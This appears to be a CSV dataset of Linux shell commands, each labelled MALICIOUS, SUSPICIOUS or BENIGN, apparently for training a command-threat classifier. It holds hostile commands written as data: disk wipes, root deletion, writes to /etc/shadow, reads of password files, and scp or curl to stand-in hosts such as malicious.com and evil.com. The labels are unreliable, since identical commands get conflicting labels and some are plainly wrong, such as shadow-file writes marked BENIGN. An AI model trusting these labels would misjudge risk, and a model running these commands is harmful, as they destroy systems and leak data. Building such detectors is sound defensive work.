command,label
dd   if=/dev/zero of=/dev/sda,MALICIOUS
 touch homework.doc,BENIGN
SCP DATA.TAR.GZ ROOT@192.168.0.2:/TMP/,SUSPICIOUS
echo 'hello' ,BENIGN
scp file.txt root@backup.server:/var/www,MALICIOUS
 cat /home/user/info.txt,BENIGN
GREP   ROOT /ETC/PASSWD,SUSPICIOUS
wget http://fileshare.com/exploit.zip ,MALICIOUS
 echo 'hacked' >> /etc/shadow,BENIGN
ECHO 'HELLO WORLD',BENIGN
ECHO 'HACKED' >   /ROOT/.BASHRC,MALICIOUS
ECHO 'HACKED' >>   /VAR/LOG/SYSLOG,SUSPICIOUS
 scp file.txt user@malicious.com:/tmp/,SUSPICIOUS
ps aux |   grep nginx,BENIGN
ssh   -L 8080:target.com:80 attacker@remote,MALICIOUS
 wget http://fileshare.com/update.bin,BENIGN
LS   -AL,BENIGN
echo   'owned' > /var/log/syslog,MALICIOUS
scp backup.sql user@malicious.com:/tmp/,MALICIOUS
 top -n 1,BENIGN
MV /BIN/BASH /TMP/BASH,MALICIOUS
echo   'pwned' > /var/log/syslog,SUSPICIOUS
wget   http://evil.com/exploit.zip,BENIGN
curl -O http://suspicious.org/exploit.zip ,SUSPICIOUS
scp   backup.sql user@backup.server:/tmp/,BENIGN
CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
scp backup.sql root@192.168.0.2:/var/www,SUSPICIOUS
 RM -RF /* --NO-PRESERVE-ROOT,MALICIOUS
echo   'hacked' >> /etc/shadow,BENIGN
SUDO   APT INSTALL NET-TOOLS,SUSPICIOUS
curl   -O http://fileshare.com/update.bin,BENIGN
scp file.txt root@backup.server:/root/,MALICIOUS
scp backup.sql root@malicious.com:/tmp/,MALICIOUS
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
PING   GOOGLE.COM,BENIGN
wget http://evil.com/payload.sh ,SUSPICIOUS
CAT /ETC/PASSWD,MALICIOUS
 FIND / -NAME 'TEST',BENIGN
ECHO   'OWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
 sudo su,SUSPICIOUS
ECHO 'HACKED' > /ETC/SHADOW,MALICIOUS
curl   https://evil.com/payload.sh,SUSPICIOUS
GREP ROOT   /ETC/PASSWD,SUSPICIOUS
chmod 777 /root/.bashrc ,BENIGN
IFCONFIG ,BENIGN
curl -O   http://suspicious.org/exploit.zip,MALICIOUS
curl   https://suspicious.org/exploit.zip,BENIGN
sudo apt   install htop,MALICIOUS
echo 'pwned'   > /root/.bashrc,SUSPICIOUS
curl -O http://fileshare.com/payload.sh ,BENIGN
CD /TMP/,BENIGN
scp   data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS
 CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
echo   'pwned' > /root/.bashrc,MALICIOUS
SUDO -L ,SUSPICIOUS
 PWD,BENIGN
 CD /VAR/WWW,SUSPICIOUS
ps aux |   grep sshd,BENIGN
scp file.txt user@malicious.com:/var/www,SUSPICIOUS
RM   -RF /* --NO-PRESERVE-ROOT,MALICIOUS
 rm -rf /var/,BENIGN
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP ,BENIGN
scp backup.sql admin@backup.server:/var/www,MALICIOUS
ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS
LS /TMP/ ,SUSPICIOUS
CAT /ETC/SHADOW ,MALICIOUS
echo   'pwned' >> /var/log/syslog,BENIGN
scp   data.tar.gz user@backup.server:/tmp/,SUSPICIOUS
chmod 777 /etc/shadow ,MALICIOUS
echo   'owned' > /root/.bashrc,BENIGN
WGET   HTTP://EVIL.COM/UPDATE.BIN,MALICIOUS
CURL   HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
CAT HOMEWORK.TXT,BENIGN
CAT   /VAR/LOG/AUTH.LOG,SUSPICIOUS
CAT /ETC/PASSWD ,MALICIOUS
DD IF=/DEV/ZERO   OF=/DEV/SDA,MALICIOUS
ps aux | grep sshd ,SUSPICIOUS
wget http://malicious.com/payload.sh ,MALICIOUS
SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
echo 'owned'   >> /root/.bashrc,SUSPICIOUS
 scp backup.sql user@192.168.0.2:/root/,BENIGN
echo 'owned'   >> /var/log/syslog,BENIGN
mv /bin/bash /tmp/bash ,MALICIOUS
ps   aux | grep sshd,MALICIOUS
 CAT /ETC/SHADOW,MALICIOUS
CAT WELCOME.TXT ,BENIGN
CD /ROOT/,BENIGN
RM -RF /VAR/ ,BENIGN
echo 'owned'   > /var/log/syslog,BENIGN
SUDO APT   INSTALL NET-TOOLS,SUSPICIOUS
WGET   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
netstat -tulnp ,SUSPICIOUS
scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS
ECHO 'PWNED' >> /ETC/SHADOW,BENIGN
ECHO   'PWNED' >> /ROOT/.BASHRC,SUSPICIOUS
TOUCH   HOMEWORK.DOC,BENIGN
ps aux   | grep mysql,MALICIOUS
echo 'pwned' >>   /var/log/syslog,BENIGN
ssh   -l 8080:target.com:80 attacker@remote,MALICIOUS
PS AUX |   GREP NGINX,SUSPICIOUS
echo   'pwned' >> /etc/shadow,MALICIOUS
GREP 'PASSWORD'   /ETC/PASSWD,MALICIOUS
scp data.tar.gz root@backup.server:/root/,MALICIOUS
 curl -O http://suspicious.org/update.bin,MALICIOUS
scp data.tar.gz user@malicious.com:/tmp/,BENIGN
WGET   HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
echo 'hacked' >>   /etc/shadow,BENIGN
curl -o http://evil.com/payload.sh ,MALICIOUS
scp data.tar.gz root@192.168.0.2:/root/,SUSPICIOUS
echo 'owned' >   /var/log/syslog,BENIGN
PS AUX ,SUSPICIOUS
NETSTAT   -TULNP,SUSPICIOUS
 iptables -f,MALICIOUS
DD   IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
RM -RF /* --NO-PRESERVE-ROOT,MALICIOUS
CAT .BASHRC ,BENIGN
SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
CAT   /ETC/PASSWD,MALICIOUS
WATCH NETSTAT -AN,SUSPICIOUS
scp data.tar.gz user@192.168.0.2:/root/,MALICIOUS
 cat notes.txt,BENIGN
 wget http://suspicious.org/update.bin,BENIGN
ECHO 'HELLO WORLD' ,BENIGN
 PS AUX | GREP SSHD,SUSPICIOUS
du -sh ,BENIGN
scp file.txt admin@backup.server:/var/www,SUSPICIOUS
ps aux   | grep nginx,BENIGN
sudo   apt install nmap,SUSPICIOUS
scp file.txt admin@malicious.com:/var/www,BENIGN
scp backup.sql user@malicious.com:/var/www,SUSPICIOUS
 MV /BIN/BASH /TMP/BASH,MALICIOUS
curl -O   http://suspicious.org/update.bin,MALICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS
SCP BACKUP.SQL ADMIN@192.168.0.2:/ROOT/,MALICIOUS
 curl -O http://suspicious.org/exploit.zip,BENIGN
find / -name 'test' ,BENIGN
scp   data.tar.gz user@malicious.com:/tmp/,SUSPICIOUS
SUDO APT UPDATE,BENIGN
echo 'hacked' > /etc/shadow ,BENIGN
 CURL -O HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
curl -o   http://malicious.com/malware.bin,MALICIOUS
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
scp file.txt admin@malicious.com:/root/,SUSPICIOUS
WGET   HTTP://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
 IFCONFIG,BENIGN
iptables -f ,MALICIOUS
WHOAMI ,BENIGN
CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
scp file.txt admin@malicious.com:/var/www ,BENIGN
 SCP DATA.TAR.GZ ROOT@192.168.0.2:/TMP/,SUSPICIOUS
curl https://fileshare.com/update.bin ,MALICIOUS
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN ,MALICIOUS
ECHO 'HACKED' >> /VAR/LOG/SYSLOG,BENIGN
 curl -O http://evil.com/exploit.zip,MALICIOUS
CURL -O HTTP://FILESHARE.COM/EXPLOIT.ZIP ,MALICIOUS
CAT /HOME/USER/TODO.TXT,BENIGN
 CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS
 CAT HOMEWORK.TXT,BENIGN
scp   backup.sql admin@malicious.com:/root/,SUSPICIOUS
curl https://evil.com/update.bin ,MALICIOUS
curl -O   http://suspicious.org/payload.sh,MALICIOUS
scp file.txt root@192.168.0.2:/root/ ,SUSPICIOUS
scp backup.sql user@backup.server:/root/,SUSPICIOUS
SCP BACKUP.SQL ROOT@BACKUP.SERVER:/ROOT/,SUSPICIOUS
scp data.tar.gz user@192.168.0.2:/var/www,MALICIOUS
CURL HTTPS://EVIL.COM/PAYLOAD.SH ,SUSPICIOUS
scp file.txt user@backup.server:/tmp/,MALICIOUS
 CAT WELCOME.TXT,BENIGN
ps aux ,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/UPDATE.BIN,BENIGN
ls /var/www ,BENIGN
CHMOD   777 /ROOT/.BASHRC,SUSPICIOUS
 curl -O http://malicious.com/malware.bin,MALICIOUS
UNAME   -A,SUSPICIOUS
CURL -O HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS
 wget http://fileshare.com/exploit.zip,BENIGN
scp backup.sql root@192.168.0.2:/tmp/ ,SUSPICIOUS
wget http://fileshare.com/update.bin ,MALICIOUS
 chmod 777 /var/log/syslog,MALICIOUS
 echo 'hello',BENIGN
scp   file.txt admin@backup.server:/var/www,SUSPICIOUS
curl -O http://evil.com/payload.sh ,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote ,MALICIOUS
curl   -O http://suspicious.org/payload.sh,BENIGN
ECHO 'PWNED'   >> /VAR/LOG/SYSLOG,BENIGN
echo   'pwned' > /etc/shadow,SUSPICIOUS
cat notes.txt ,BENIGN
scp backup.sql admin@malicious.com:/root/ ,SUSPICIOUS
uname -a ,SUSPICIOUS
sudo apt install htop ,MALICIOUS
 CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
 LS -AL,BENIGN
scp file.txt   root@192.168.0.2:/tmp/,BENIGN
 echo 'pwned' > /root/.bashrc,SUSPICIOUS
TOUCH HOMEWORK.DOC ,BENIGN
scp backup.sql root@192.168.0.2:/root/,MALICIOUS
 CHMOD 777 /ROOT/.BASHRC,BENIGN
 WHICH PYTHON,SUSPICIOUS
CURL HTTPS://FILESHARE.COM/UPDATE.BIN,BENIGN
WATCH   NETSTAT -AN,SUSPICIOUS
wget   http://suspicious.org/payload.sh,BENIGN
 curl https://evil.com/update.bin,BENIGN
ECHO 'HACKED' >>   /ROOT/.BASHRC,MALICIOUS
 curl https://suspicious.org/update.bin,MALICIOUS
WATCH NETSTAT -AN ,SUSPICIOUS
ps   aux | grep mysql,BENIGN
CAT /HOME/USER/TODO.TXT ,BENIGN
ps aux | grep mysql ,BENIGN
SUDO   APT UPDATE,BENIGN
SCP   FILE.TXT USER@192.168.0.2:/ROOT/,SUSPICIOUS
CURL   -O HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
rm -rf /var/ ,SUSPICIOUS
 MKDIR TEST,BENIGN
scp file.txt admin@192.168.0.2:/var/www ,BENIGN
echo 'pwned'   > /etc/shadow,SUSPICIOUS
echo 'pwned' >>   /etc/shadow,MALICIOUS
ps aux | grep   nginx,SUSPICIOUS
ECHO 'MALWARE' > /TMP/MALWARE.SH ,MALICIOUS
scp backup.sql user@backup.server:/var/www,MALICIOUS
scp backup.sql root@backup.server:/var/www,BENIGN
 SUDO APT INSTALL NET-TOOLS,MALICIOUS
 scp data.tar.gz root@malicious.com:/var/www,SUSPICIOUS
 PS AUX | GREP NGINX,BENIGN
SUDO APT INSTALL   NMAP,SUSPICIOUS
LS   /VAR/WWW,MALICIOUS
scp data.tar.gz root@192.168.0.2:/var/www,BENIGN
SUDO APT INSTALL   NET-TOOLS,BENIGN
chmod 777 /var/log/syslog ,SUSPICIOUS
wget   http://evil.com/payload.sh,BENIGN
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
 CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS
scp file.txt root@192.168.0.2:/tmp/,SUSPICIOUS
scp data.tar.gz root@192.168.0.2:/tmp/ ,SUSPICIOUS
echo 'hacked' >   /var/log/syslog,SUSPICIOUS
scp   backup.sql admin@192.168.0.2:/tmp/,MALICIOUS
SUDO APT   UPDATE,BENIGN
 echo 'hacked' > /root/.bashrc,MALICIOUS
scp backup.sql   user@malicious.com:/root/,BENIGN
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH ,BENIGN
curl https://suspicious.org/update.bin ,SUSPICIOUS
echo 'hacked'   >> /var/log/syslog,BENIGN
curl -o http://fileshare.com/update.bin,BENIGN
 scp file.txt user@backup.server:/root/,BENIGN
RM -RF   /VAR/,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/var/www,BENIGN
IPTABLES   -F,MALICIOUS
 curl https://evil.com/exploit.zip,SUSPICIOUS
curl -o http://suspicious.org/update.bin,BENIGN
ECHO 'HACKED'   > /ETC/SHADOW,SUSPICIOUS
curl -o   http://fileshare.com/payload.sh,BENIGN
scp data.tar.gz root@malicious.com:/root/,BENIGN
curl -O http://fileshare.com/exploit.zip ,BENIGN
scp file.txt admin@backup.server:/tmp/,SUSPICIOUS
CURL HTTPS://EVIL.COM/EXPLOIT.ZIP,BENIGN
echo 'owned' > /etc/shadow ,SUSPICIOUS
 CAT /ETC/PASSWD,MALICIOUS
 echo 'hacked' > /etc/shadow,SUSPICIOUS
scp data.tar.gz root@192.168.0.2:/var/www ,MALICIOUS
RM -RF   /,MALICIOUS
 curl https://suspicious.org/payload.sh,MALICIOUS
WGET   HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
SCP DATA.TAR.GZ   ROOT@BACKUP.SERVER:/TMP/,MALICIOUS
scp data.tar.gz admin@backup.server:/var/www,SUSPICIOUS
curl   https://evil.com/exploit.zip,BENIGN
 sudo -l,SUSPICIOUS
sudo apt install   nmap,SUSPICIOUS
 HISTORY,SUSPICIOUS
 SUDO SU,SUSPICIOUS
scp file.txt user@192.168.0.2:/root/ ,SUSPICIOUS
 SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
scp   data.tar.gz root@backup.server:/var/www,BENIGN
 LS /VAR/WWW,BENIGN
 WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
 CAT /VAR/LOG/SYSLOG,SUSPICIOUS
ECHO 'PWNED' > /VAR/LOG/SYSLOG,MALICIOUS
FIND / -NAME   'TEST',BENIGN
ECHO 'HACKED' >>   /ETC/SHADOW,MALICIOUS
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP ,MALICIOUS
echo 'pwned'   >> /root/.bashrc,SUSPICIOUS
curl   -O http://fileshare.com/exploit.zip,BENIGN
scp   data.tar.gz admin@192.168.0.2:/root/,SUSPICIOUS
ECHO 'PWNED' > /VAR/LOG/SYSLOG ,MALICIOUS
CAT /HOME/USER/INFO.TXT ,BENIGN
scp   file.txt admin@malicious.com:/var/www,BENIGN
scp file.txt   root@malicious.com:/tmp/,BENIGN
scp data.tar.gz root@malicious.com:/var/www,SUSPICIOUS
 curl -O http://fileshare.com/update.bin,SUSPICIOUS
RM -RF /*   --NO-PRESERVE-ROOT,MALICIOUS
scp file.txt user@malicious.com:/var/www ,SUSPICIOUS
 scp data.tar.gz root@192.168.0.2:/var/www,SUSPICIOUS
curl -O   http://fileshare.com/exploit.zip,SUSPICIOUS
scp backup.sql   root@malicious.com:/tmp/,SUSPICIOUS
 scp data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS
ECHO 'HACKED'   > /ROOT/.BASHRC,MALICIOUS
CURL -O HTTP://EVIL.COM/UPDATE.BIN,BENIGN
TOP -N   1,BENIGN
scp file.txt user@192.168.0.2:/root/,SUSPICIOUS
ECHO 'PWNED' >> /ETC/SHADOW ,SUSPICIOUS
echo 'owned' >   /root/.bashrc,BENIGN
scp   backup.sql root@malicious.com:/var/www,BENIGN
curl https://evil.com/exploit.zip ,MALICIOUS
MV /BIN/BASH   /TMP/BASH,MALICIOUS
echo 'owned' >>   /etc/shadow,MALICIOUS
 GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS
 echo 'pwned' >> /var/log/syslog,MALICIOUS
echo   'hacked' >> /var/log/syslog,BENIGN
 CAT README.MD,BENIGN
 scp backup.sql user@192.168.0.2:/var/www,SUSPICIOUS
scp data.tar.gz admin@192.168.0.2:/root/,SUSPICIOUS
scp backup.sql   root@192.168.0.2:/tmp/,SUSPICIOUS
 CURL HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS
PS AUX   | GREP NGINX,MALICIOUS
echo 'owned'   >> /etc/shadow,SUSPICIOUS
scp   data.tar.gz admin@backup.server:/root/,BENIGN
ECHO   'HACKED' > /ROOT/.BASHRC,MALICIOUS
ECHO 'HACKED' > /ETC/SHADOW ,BENIGN
curl -O http://evil.com/exploit.zip ,BENIGN
WGET   HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/VAR/WWW ,MALICIOUS
 ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
wget   http://fileshare.com/update.bin,SUSPICIOUS
scp data.tar.gz user@backup.server:/tmp/,MALICIOUS
scp data.tar.gz   user@malicious.com:/tmp/,MALICIOUS
curl -o http://evil.com/update.bin,MALICIOUS
ECHO   'OWNED' >> /ETC/SHADOW,BENIGN
scp file.txt   admin@backup.server:/var/www,MALICIOUS
scp backup.sql   root@backup.server:/var/www,SUSPICIOUS
scp backup.sql   user@backup.server:/tmp/,SUSPICIOUS
SCP BACKUP.SQL ROOT@BACKUP.SERVER:/TMP/ ,MALICIOUS
CD /ROOT/ ,BENIGN
RM   -RF /HOME/USER,SUSPICIOUS
curl https://evil.com/payload.sh ,BENIGN
 echo 'owned' > /etc/shadow,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/root/,SUSPICIOUS
CAT HOMEWORK.TXT ,BENIGN
scp file.txt user@192.168.0.2:/var/www ,SUSPICIOUS
curl -O   http://fileshare.com/payload.sh,BENIGN
curl   -o http://malicious.com/malware.bin,MALICIOUS
PS AUX | GREP NGINX ,MALICIOUS
curl https://fileshare.com/exploit.zip ,MALICIOUS
SUDO APT INSTALL NMAP,MALICIOUS
 scp backup.sql admin@backup.server:/tmp/,MALICIOUS
 curl -O http://fileshare.com/exploit.zip,SUSPICIOUS
SUDO APT INSTALL NMAP ,MALICIOUS
HISTORY ,SUSPICIOUS
ECHO 'HACKED' >> /ROOT/.BASHRC,MALICIOUS
MV   /BIN/BASH /TMP/BASH,MALICIOUS
scp file.txt admin@backup.server:/root/,MALICIOUS
ECHO 'PWNED' >> /VAR/LOG/SYSLOG ,SUSPICIOUS
 wget http://evil.com/payload.sh,SUSPICIOUS
scp backup.sql user@192.168.0.2:/tmp/ ,MALICIOUS
WGET HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
PS AUX | GREP MYSQL ,BENIGN
ECHO 'OWNED'   > /ETC/SHADOW,SUSPICIOUS
scp data.tar.gz   root@backup.server:/tmp/,BENIGN
CURL -O   HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
echo   'pwned' >> /root/.bashrc,SUSPICIOUS
curl -o http://fileshare.com/payload.sh,SUSPICIOUS
 curl -O http://fileshare.com/payload.sh,SUSPICIOUS
echo 'hacked' >> /etc/shadow ,BENIGN
curl -o http://suspicious.org/payload.sh,BENIGN
 DU -SH,BENIGN
scp file.txt admin@malicious.com:/tmp/,MALICIOUS
 echo 'owned' > /var/log/syslog,MALICIOUS
scp backup.sql admin@backup.server:/root/ ,MALICIOUS
ECHO   'PWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS
SCP BACKUP.SQL USER@MALICIOUS.COM:/TMP/,MALICIOUS
SUDO   APT INSTALL HTOP,MALICIOUS
 scp file.txt admin@192.168.0.2:/var/www,SUSPICIOUS
scp backup.sql   admin@backup.server:/var/www,BENIGN
SCP FILE.TXT ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
echo 'owned' > /root/.bashrc ,MALICIOUS
SCP FILE.TXT USER@BACKUP.SERVER:/TMP/,SUSPICIOUS
echo 'pwned' >   /root/.bashrc,BENIGN
WGET HTTP://EVIL.COM/EXPLOIT.ZIP,BENIGN
 echo 'pwned' > /etc/shadow,MALICIOUS
SCP FILE.TXT USER@192.168.0.2:/VAR/WWW,SUSPICIOUS
CURL   -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH ,BENIGN
SUDO   APT INSTALL NMAP,BENIGN
sudo   apt install htop,SUSPICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
curl -o   http://suspicious.org/payload.sh,MALICIOUS
CURL -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
scp   backup.sql admin@backup.server:/root/,SUSPICIOUS
 curl https://fileshare.com/payload.sh,SUSPICIOUS
echo   'hacked' > /etc/shadow,MALICIOUS
 ssh -l 8080:target.com:80 attacker@remote,MALICIOUS
scp   backup.sql user@malicious.com:/var/www,BENIGN
 echo 'owned' >> /etc/shadow,BENIGN
echo   'hacked' >> /root/.bashrc,MALICIOUS
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
MV /BIN/BASH /TMP/BASH ,MALICIOUS
scp data.tar.gz admin@malicious.com:/var/www ,SUSPICIOUS
CURL -O   HTTP://EVIL.COM/EXPLOIT.ZIP,BENIGN
wget   http://suspicious.org/exploit.zip,BENIGN
echo   'owned' >> /var/log/syslog,SUSPICIOUS
 ECHO 'HACKED' > /ROOT/.BASHRC,MALICIOUS
curl   -o http://fileshare.com/payload.sh,SUSPICIOUS
CURL   HTTPS://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
scp file.txt root@backup.server:/tmp/,SUSPICIOUS
ECHO 'OWNED' >>   /ETC/SHADOW,MALICIOUS
scp   backup.sql admin@192.168.0.2:/root/,BENIGN
scp data.tar.gz admin@malicious.com:/root/ ,MALICIOUS
ssh -l 8080:target.com:80   attacker@remote,MALICIOUS
curl   -o http://suspicious.org/exploit.zip,MALICIOUS
curl -o http://fileshare.com/exploit.zip ,BENIGN
scp backup.sql user@192.168.0.2:/root/ ,MALICIOUS
GREP ROOT /ETC/PASSWD ,SUSPICIOUS
CAT /VAR/LOG/AUTH.LOG ,SUSPICIOUS
CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,SUSPICIOUS
echo   'owned' >> /etc/shadow,BENIGN
scp backup.sql   admin@malicious.com:/var/www,SUSPICIOUS
CHMOD   777 /VAR/LOG/SYSLOG,MALICIOUS
ECHO 'OWNED' >   /ETC/SHADOW,MALICIOUS
scp backup.sql user@192.168.0.2:/tmp/,BENIGN
wget http://suspicious.org/payload.sh ,MALICIOUS
scp   file.txt admin@192.168.0.2:/root/,MALICIOUS
CURL   -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS
 echo 'hacked' >> /var/log/syslog,BENIGN
echo   'hacked' > /var/log/syslog,MALICIOUS
curl -o   http://suspicious.org/exploit.zip,BENIGN
WGET HTTP://EVIL.COM/UPDATE.BIN,BENIGN
scp data.tar.gz admin@malicious.com:/tmp/,SUSPICIOUS
GREP 'PASSWORD' /ETC/PASSWD ,MALICIOUS
SCP FILE.TXT   ADMIN@MALICIOUS.COM:/VAR/WWW,BENIGN
scp data.tar.gz admin@backup.server:/tmp/,MALICIOUS
SCP DATA.TAR.GZ ROOT@BACKUP.SERVER:/ROOT/,BENIGN
 curl -o http://evil.com/payload.sh,MALICIOUS
 WATCH NETSTAT -AN,SUSPICIOUS
scp data.tar.gz   root@192.168.0.2:/tmp/,MALICIOUS
curl https://fileshare.com/payload.sh ,SUSPICIOUS
UNAME -A ,SUSPICIOUS
curl   -O http://suspicious.org/exploit.zip,BENIGN
scp backup.sql   user@backup.server:/var/www,BENIGN
 curl -o http://evil.com/exploit.zip,BENIGN
scp backup.sql user@malicious.com:/root/,MALICIOUS
echo 'hacked'   > /var/log/syslog,MALICIOUS
ssh -l   8080:target.com:80 attacker@remote,MALICIOUS
CURL HTTPS://FILESHARE.COM/PAYLOAD.SH ,BENIGN
TOP -N 1 ,BENIGN
WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
scp file.txt root@192.168.0.2:/root/,BENIGN
 ECHO 'HACKED' >> /VAR/LOG/SYSLOG,SUSPICIOUS
scp   backup.sql admin@malicious.com:/tmp/,BENIGN
SCP   BACKUP.SQL ROOT@192.168.0.2:/ROOT/,SUSPICIOUS
LS /VAR/WWW ,BENIGN
scp data.tar.gz admin@backup.server:/root/,MALICIOUS
 wget http://evil.com/update.bin,MALICIOUS
SCP   FILE.TXT ROOT@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
 curl -o http://malicious.com/malware.bin,MALICIOUS
SCP FILE.TXT USER@BACKUP.SERVER:/VAR/WWW ,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
ps   aux | grep nginx,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@BACKUP.SERVER:/ROOT/,SUSPICIOUS
scp backup.sql admin@backup.server:/var/www ,BENIGN
scp backup.sql   root@192.168.0.2:/root/,BENIGN
 CURL -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
 WHOAMI,BENIGN
WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN ,MALICIOUS
CURL -O   HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
ECHO   'HACKED' > /ETC/SHADOW,MALICIOUS
SCP FILE.TXT ADMIN@192.168.0.2:/TMP/,BENIGN
scp backup.sql   admin@192.168.0.2:/tmp/,BENIGN
 CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
curl   -O http://suspicious.org/update.bin,MALICIOUS
 CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,BENIGN
 SUDO APT INSTALL NMAP,BENIGN
scp file.txt   user@backup.server:/tmp/,MALICIOUS
 scp data.tar.gz user@backup.server:/var/www,SUSPICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
scp backup.sql admin@backup.server:/root/,SUSPICIOUS
 curl -o http://suspicious.org/exploit.zip,SUSPICIOUS
curl -o http://suspicious.org/exploit.zip ,MALICIOUS
ECHO 'HELLO   WORLD',BENIGN
scp file.txt admin@backup.server:/root/ ,BENIGN
scp backup.sql user@backup.server:/tmp/,SUSPICIOUS
SCP FILE.TXT   ROOT@BACKUP.SERVER:/TMP/,MALICIOUS
 echo 'owned' >> /root/.bashrc,SUSPICIOUS
scp   data.tar.gz admin@malicious.com:/root/,SUSPICIOUS
 wget http://fileshare.com/payload.sh,SUSPICIOUS
ECHO 'PWNED' >>   /ETC/SHADOW,MALICIOUS
SCP FILE.TXT ROOT@MALICIOUS.COM:/ROOT/,BENIGN
scp data.tar.gz   admin@backup.server:/root/,SUSPICIOUS
scp data.tar.gz   user@192.168.0.2:/root/,BENIGN
CD /ROOT ,SUSPICIOUS
 wget http://suspicious.org/payload.sh,SUSPICIOUS
